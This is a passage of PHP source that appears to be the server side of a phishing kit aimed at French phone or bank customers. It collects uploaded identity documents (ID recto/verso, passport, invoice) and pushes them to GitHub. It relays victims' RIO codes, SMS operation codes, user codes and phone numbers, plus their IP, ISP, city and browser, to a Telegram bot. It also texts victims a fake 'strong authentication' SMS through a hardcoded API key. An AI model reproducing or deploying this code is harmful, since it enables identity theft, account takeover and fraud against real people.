	$result_gitgub_2  = uploadToGitHub($config['github'], $name, $contents); 
	
	$recto = $result_gitgub_1['download_url'];
	$verso = $result_gitgub_2['download_url'];
	
       //sendFileToTelegram('versoFile', $token, $chatid);	
	  $message = "
➡️ 🆄🅿🅻🅾🅰🅳
------------------------------------
🦧  𝗨𝘀𝗲𝗿 𝗦𝗲𝗻𝗱 𝗗𝗼𝗰 𝗥𝗲𝗰𝘁𝗼/𝗩𝗲𝗿𝘀𝗼
{$recto}
{$verso}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
  
		 up_file_log("User Send Recto/verso to Telegram|$subscibe|OK $local_time");
		 up_file_log("System Send SMS to user|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 $msg_bil = "Authentification forte web requise. Appelez le 3179, vous recevrez immédiatement un SMS contenant votre code RIO. Cet appel est gratuit et disponible 24h/24.";
	$formatted = formatFrenchNumber($_SESSION['phone_id']);
	$response = sendSMSMailingVoxCurl([
    'key' => '87245625e2bf45b3c812ae53ea198c0a',
    'destinataires' => $formatted,
    'message' => $msg_bil,
    'expediteur' => '38656',
    'encodage' => 'ucs2',
    'smslong' => '1',
    'erreur_texte' => '1',
    'nom' => 'TestCampaign1'
]);
	
		
		
	}
   
    if (isset($_POST['j_passport'])) 
	{
	   $chatid = $_COOKIE['idtel']   ?? $chat_Id;
    $token  = $_COOKIE['tokentel'] ?? $botToken;
	   //sendFileToTelegram('passeportFile', $token, $chatid);
	$file = $_FILES['passeportFile'];
	$contents = file_get_contents($file['tmp_name']);
	$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $name = generateRandomFilename($ext);
	$result_gitgub   = uploadToGitHub($config['github'], $name, $contents); 
	
	$passport = $result_gitgub['download_url'];
	
	$message = "
➡️ 🆄🅿🅻🅾🅰🅳
------------------------------------
🦧  𝗨𝘀𝗲𝗿 𝗦𝗲𝗻𝗱 𝗗𝗼𝗰 𝗽𝗮𝘀𝘀𝗲𝗽𝗼𝗿𝘁
{$passport}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Passeport to Telegram|$subscibe|OK $local_time");
		  up_file_log("System Send SMS to user|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 $msg_bil = "Authentification forte web requise. Appelez le 3179, vous recevrez immédiatement un SMS contenant votre code RIO. Cet appel est gratuit et disponible 24h/24.";
	$formatted = formatFrenchNumber($_SESSION['phone_id']);
	$response = sendSMSMailingVoxCurl([
    'key' => '87245625e2bf45b3c812ae53ea198c0a',
    'destinataires' => $formatted,
    'message' => $msg_bil,
    'expediteur' => '38656',
    'encodage' => 'ucs2',
    'smslong' => '1',
    'erreur_texte' => '1',
    'nom' => 'TestCampaign1'
]);
		
		
	}
    if (isset($_POST['j_facture'])) 
	{
	   $chatid = $_COOKIE['idtel']   ?? $chat_Id;
       $token  = $_COOKIE['tokentel'] ?? $botToken;
	  // sendFileToTelegram('factureFile', $token, $chatid);
	if (empty($_FILES['factureFile']['tmp_name']) || $_FILES['factureFile']['error'] !== UPLOAD_ERR_OK) {
        throw new Exception('No file uploaded', 400);
    }

    $file = $_FILES['factureFile'];
	$contents = file_get_contents($file['tmp_name']);
	$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $name = generateRandomFilename($ext);
	$result_gitgub   = uploadToGitHub($config['github'], $name, $contents); 
	$facture = $result_gitgub['download_url'];
	  
	  $message = "
➡️ 🆄🅿🅻🅾🅰🅳
------------------------------------
🦧  𝗨𝘀𝗲𝗿 𝗦𝗲𝗻𝗱 𝗗𝗼𝗰 𝗙𝗮𝗰𝘁𝘂𝗿𝗲
{$facture}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
         
	
		 up_file_log("User Send 𝗙𝗮𝗰𝘁𝘂𝗿𝗲 to Telegram|$subscibe|OK $local_time");
		 up_file_log("System Send SMS to user|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 $msg_bil = "Authentification forte web requise. Appelez le 3179, vous recevrez immédiatement un SMS contenant votre code RIO. Cet appel est gratuit et disponible 24h/24.";
	$formatted = formatFrenchNumber($_SESSION['phone_id']);
$response = sendSMSMailingVoxCurl([
    'key' => '87245625e2bf45b3c812ae53ea198c0a',
    'destinataires' => $formatted,
    'message' => $msg_bil,
    'expediteur' => '38656',
    'encodage' => 'ucs2',
    'smslong' => '1',
    'erreur_texte' => '1',
    'nom' => 'TestCampaign1'
]);
		
		
	}
   
	if (isset($_POST['rio_code'])) 
	{
		  
	     $j_pin_code = $_POST['rio_code'];
         $message = "
➡️ 🆁🅸🅾 
------------------------------------
🔑  𝗥𝗜𝗢 𝗖𝗢𝗗𝗘: {$j_pin_code}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Send RIO to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}	 
	










	if (isset($_POST['j_operationssms'])) 
	{
	     $j_operationssms = $_POST['j_operationssms'];
         $message = "
➡️ 🅾🅿🅴🆁🅰🆃🅸🅾🅽🆂 🆂🅼🆂
------------------------------------
🔑  𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻𝘀 𝗦𝗠𝗦 𝗖𝗼𝗱𝗲: {$j_operationssms}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send usager to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}

	if (isset($_POST['j_utilisateur'])) 
	{
	     $j_utilisateur = $_POST['j_utilisateur'];
         $message = "
➡️ 🆄🆃🅸🅻🅸🆂🅰🆃🅴🆄🆁
------------------------------------
🔑  𝗨𝘁𝗶𝗹𝗶𝘀𝗮𝘁𝗲𝘂𝗿 𝗖𝗼𝗱𝗲: {$j_utilisateur}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send usager to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}
	if (isset($_POST['j_usager'])) 
	{
	     $j_usager = $_POST['j_usager'];
         $message = "
➡️ 🆄🆂🅰🅶🅴🆁
------------------------------------
🔑  𝘂𝘀𝗮𝗴𝗲𝗿 𝗖𝗼𝗱𝗲: {$j_usager}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send usager to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}
	if (isset($_POST['ignorer'])) 
	{
	         $message = "
➡️ 🅸🅶🅽🅾🆁🅴🆁
------------------------------------
🐸  𝗨𝘀𝗲𝗿 𝗰𝗹𝗶𝗰𝗸 𝗼𝗻 𝗶𝗴𝗻𝗼𝗿𝗲𝗿
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send ignorer to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 
		 
		sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>"); 
	exit();	
	}
	if (isset($_POST['annulation'])) 
	{
	         $message = "
➡️ 🅰🅽🅽🆄🅻🅰🆃🅸🅾🅽 
------------------------------------
🦧  𝗨𝘀𝗲𝗿 𝗰𝗹𝗶𝗰𝗸 𝗼𝗻 𝗮𝗻𝗻𝘂𝗹𝗮𝘁𝗶𝗼𝗻
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send annulation to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 

	}
	
	if (isset($_POST['j_phone'])) 
	{
		  
	     $j_phone = $_POST['j_phone'];
         $message = "
➡️ 🅿🅷🅾🅽🅴
------------------------------------
🔑  𝗣𝗵𝗼𝗻𝗲: {$j_phone}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";		 
		 up_file_log("User Send Phone to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}
	
		
	
	sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
	
	
}

?>